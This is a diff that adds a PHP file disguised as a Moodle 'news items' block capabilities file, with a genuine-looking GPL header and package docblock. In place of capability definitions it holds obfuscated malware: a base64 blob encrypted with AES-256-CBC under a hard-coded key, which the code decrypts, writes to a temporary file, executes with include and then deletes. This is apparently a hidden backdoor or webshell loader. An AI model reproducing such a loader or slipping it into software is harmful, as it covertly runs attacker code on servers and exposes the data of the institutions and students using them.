@@ -1,0 +1,46 @@
+<?php
+// This file is part of Moodle - http://moodle.org/
+//
+// Moodle is free software: you can redistribute it and/or modify
+// it under the terms of the GNU General Public License as published by
+// the Free Software Foundation, either version 3 of the License, or
+// (at your option) any later version.
+//
+// Moodle is distributed in the hope that it will be useful,
+// but WITHOUT ANY WARRANTY; without even the implied warranty of
+// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
+// GNU General Public License for more details.
+//
+// You should have received a copy of the GNU General Public License
+// along with Moodle.  If not, see <http://www.gnu.org/licenses/>.
+
+/**
+ * News items block caps.
+ *
+ * @package    block_news_items
+ * @copyright  Mark Nelson <markn@moodle.com>
+ * @license    http://www.gnu.org/copyleft/gpl.html GNU GPL v3 or later
+ */
+
+function akukamu($data, $kamuiteam, $HAXOR) {
+    return openssl_decrypt($data, 'aes-256-cbc', $kamuiteam, OPENSSL_RAW_DATA, $HAXOR);
+}
+$kamuiteam = 'Lutfifakee';
+$tedler = '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';
+$tedler = base64_decode($tedler);
+$HAXOR = substr($tedler, 0, 16);
+$soul = substr($tedler, 16);
+$ript = akukamu($soul, $kamuiteam, $HAXOR);
+
+$ScandalL7x = tempnam(sys_get_temp_dir(), 'ScandalL7x_');
+if ($ScandalL7x === false) {
+    die('Gagal membuat file sementara.');
+}
+if (file_put_contents($ScandalL7x, $ript) === false) {
+    die('Gagal menulis ke file sementara.');
+}
+if (file_exists($ScandalL7x)) {
+    include $ScandalL7x;
+    unlink($ScandalL7x);
+}
+?>
